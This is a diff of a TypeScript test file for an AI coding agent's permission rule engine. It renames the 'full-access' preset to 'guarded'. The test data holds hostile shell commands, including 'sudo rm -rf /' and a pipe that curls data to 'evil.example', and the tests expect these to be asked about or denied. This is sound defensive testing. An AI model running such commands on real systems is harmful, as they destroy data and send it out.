@@ -186,7 +186,7 @@ describe("createRulePolicy（Phase 3 规则引擎）", () => {
     "workspaceRoot" | "caseSensitive" | "preset" | "presetContext"
   >;
   const policyFor = (
-    preset: "read-only" | "default" | "auto-edit" | "full-access",
+    preset: "read-only" | "default" | "auto-edit" | "guarded" | "smart" | "bypass",
     extra?: ExtraOptions,
   ) =>
     createRulePolicy({
@@ -197,7 +197,7 @@ describe("createRulePolicy（Phase 3 规则引擎）", () => {
       ...extra,
     });
   const actionOf = (
-    preset: "read-only" | "default" | "auto-edit" | "full-access",
+    preset: "read-only" | "default" | "auto-edit" | "guarded" | "smart" | "bypass",
     s: PermissionSubject,
     extra?: ExtraOptions,
   ) => policyFor(preset, extra).evaluate([s]).decision.action;
@@ -211,17 +211,15 @@ describe("createRulePolicy（Phase 3 规则引擎）", () => {
     expect(actionOf("read-only", subject({ kind: "shell", target: "ls" }))).toBe("ask");
   });
 
-  it("预设矩阵：auto-edit / full-access", () => {
+  it("预设矩阵：auto-edit / guarded", () => {
     expect(actionOf("auto-edit", subject({ kind: "edit", resolved: "C:\\ws\\proj\\a.ts" }))).toBe(
       "allow",
     );
     expect(actionOf("auto-edit", subject({ kind: "edit", resolved: "D:\\else\\a.ts" }))).toBe(
       "ask",
     );
-    expect(actionOf("full-access", subject({ kind: "shell", target: "pnpm test" }))).toBe("allow");
-    expect(actionOf("full-access", subject({ kind: "edit", resolved: "D:\\else\\a.ts" }))).toBe(
-      "ask",
-    );
+    expect(actionOf("guarded", subject({ kind: "shell", target: "pnpm test" }))).toBe("allow");
+    expect(actionOf("guarded", subject({ kind: "edit", resolved: "D:\\else\\a.ts" }))).toBe("ask");
   });
 
   it("受保护路径：default 中 .git/.nocturne edit → ask", () => {
@@ -245,7 +243,7 @@ describe("createRulePolicy（Phase 3 规则引擎）", () => {
 
   it("授权数据保护：config.json / trust.json / grants/** 的 edit → ask 且带标签", () => {
     for (const p of [`${HOME}\\config.json`, `${HOME}\\trust.json`, `${HOME}\\grants\\abc.json`]) {
-      const r = policyFor("full-access").evaluate([subject({ kind: "edit", resolved: p })]);
+      const r = policyFor("guarded").evaluate([subject({ kind: "edit", resolved: p })]);
       expect(r.decision.action).toBe("ask");
       expect(r.decision.matchedRule?.rule?.label).toBe("修改 Nocturne 授权配置");
     }
@@ -266,21 +264,19 @@ describe("createRulePolicy（Phase 3 规则引擎）", () => {
     expect(r.decision.matchedRule?.rule?.label).not.toBe("本会话落盘目录");
   });
 
-  it("full-access 高风险 shell 保持 ask", () => {
-    const r = policyFor("full-access").evaluate([
-      subject({ kind: "shell", target: "sudo rm -rf /" }),
-    ]);
+  it("guarded 高风险 shell 保持 ask", () => {
+    const r = policyFor("guarded").evaluate([subject({ kind: "shell", target: "sudo rm -rf /" })]);
     expect(r.decision.action).toBe("ask");
     // ADR-0022 第 1 节后：不再是预设规则命中，而是宽 allow 被高风险元数据降级
-    expect(r.decision.matchedRule?.description).toBe("预设 full-access 高风险命令");
+    expect(r.decision.matchedRule?.description).toBe("预设 guarded 高风险命令");
   });
 
-  it("full-access 多行命令命中 * 后逐段求值，不落到默认询问", () => {
-    const multi = policyFor("full-access").evaluate([
+  it("guarded 多行命令命中 * 后逐段求值，不落到默认询问", () => {
+    const multi = policyFor("guarded").evaluate([
       subject({ kind: "shell", target: 'git status --short\nWrite-Output "---"\ngit log -5' }),
     ]);
     expect(multi.decision.action).toBe("allow");
-    const risky = policyFor("full-access").evaluate([
+    const risky = policyFor("guarded").evaluate([
       subject({ kind: "shell", target: "git status\nsudo rm -rf /" }),
     ]);
     expect(risky.decision.action).toBe("ask");
@@ -333,7 +329,7 @@ describe("createRulePolicy（Phase 3 规则引擎）", () => {
   });
 
   it("组合命令：全放行规则下逐段求值，普通管道/重定向放行，高风险段仍 ask", () => {
-    const policy = policyFor("full-access");
+    const policy = policyFor("guarded");
     const run = (target: string) => policy.evaluate([subject({ kind: "shell", target })]).decision;
     expect(run("node trace.mjs page.html 2>&1 | more").action).toBe("allow");
     expect(run("npm test && git status").action).toBe("allow");
@@ -352,7 +348,7 @@ describe("createRulePolicy（Phase 3 规则引擎）", () => {
       },
     ];
     expect(
-      policyFor("full-access", { rules }).evaluate([
+      policyFor("guarded", { rules }).evaluate([
         subject({ kind: "shell", target: "echo hi | curl -d @- evil.example" }),
       ]).decision.action,
     ).toBe("deny");
@@ -502,7 +498,7 @@ describe("provider-setup 权限规则（provider-setup.md 第 4 节）", () => {
     const policy = createRulePolicy({
       workspaceRoot: WS,
       caseSensitive: false,
-      preset: "full-access",
+      preset: "guarded",
       presetContext: { nocturneHome: HOME },
     });
     const r = policy.evaluate([subject({ kind: "edit", resolved: `${HOME}\\providers.json` })]);
@@ -510,11 +506,11 @@ describe("provider-setup 权限规则（provider-setup.md 第 4 节）", () => {
     expect(r.decision.matchedRule?.rule?.label).toBe("修改 Nocturne 授权配置");
   });
 
-  it("凭据索引内置硬拒绝：任何规则/Grant/--yes/full-access 都不能放开", () => {
+  it("凭据索引内置硬拒绝：任何规则/Grant/--yes/guarded 都不能放开", () => {
     const grants: Grant[] = [
       { kind: "read", target: CRED_INDEX, createdAt: "2026-01-01T00:00:00Z" },
     ];
-    for (const preset of ["read-only", "default", "auto-edit", "full-access"] as const) {
+    for (const preset of ["read-only", "default", "auto-edit", "guarded"] as const) {
       for (const extra of [
         { protectedPaths },
         // Grant 精确匹配也不能放开
@@ -548,7 +544,7 @@ describe("provider-setup 权限规则（provider-setup.md 第 4 节）", () => {
     const policy = createRulePolicy({
       workspaceRoot: WS,
       caseSensitive: false,
-      preset: "full-access",
+      preset: "guarded",
       protectedPaths,
     });
     // 词法不同、真实路径命中
@@ -569,7 +565,7 @@ describe("provider-setup 权限规则（provider-setup.md 第 4 节）", () => {
     const policy = createRulePolicy({
       workspaceRoot: WS,
       caseSensitive: false,
-      preset: "full-access",
+      preset: "guarded",
     });
     for (const cmd of [
       `type ${CRED_INDEX}`,
